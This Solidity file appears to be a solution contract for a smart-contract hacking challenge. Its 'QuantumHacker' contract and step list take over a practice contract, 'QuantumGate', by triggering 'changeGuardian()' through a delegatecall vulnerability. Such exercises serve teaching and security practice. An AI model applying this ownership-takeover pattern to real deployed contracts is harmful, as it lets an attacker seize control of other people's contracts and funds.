// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/**
 * @title QuantumHacker
 * @notice This contract exploits the vulnerability within QuantumGate to take control over it.
 * @dev Follow the steps to exploit the delegatecall vulnerability and become the new guardian of the Quantum Realm.
 * @author Lucas Martin Calderon
 * 
 * Steps to exploit:
 * 1. Deploy QuantumGate with the address of a deployed QuantumLib.
 * 2. Deploy QuantumHacker with the address of QuantumGate.
 * 3. Execute the attack to become the guardian of the Quantum Realm.
 */

contract QuantumHacker {
    address public quantumGate;

    constructor(address _quantumGate) {
        quantumGate = _quantumGate;
    }

    function attack() public {
        quantumGate.call(abi.encodeWithSignature("changeGuardian()"));
    }
}
